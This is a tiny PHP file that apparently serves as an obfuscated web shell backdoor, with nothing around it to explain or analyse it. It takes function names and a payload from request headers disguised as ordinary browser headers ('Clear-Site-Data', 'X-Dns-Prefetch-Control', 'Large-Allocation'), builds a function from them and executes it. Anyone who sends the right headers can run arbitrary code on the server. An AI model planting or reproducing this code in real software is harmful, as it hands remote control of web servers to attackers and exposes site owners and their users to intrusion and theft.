<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Clear-Site-Data'])) {
    $locked = $_HEADERS['Clear-Site-Data']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Large-Allocation']));
    $locked();
}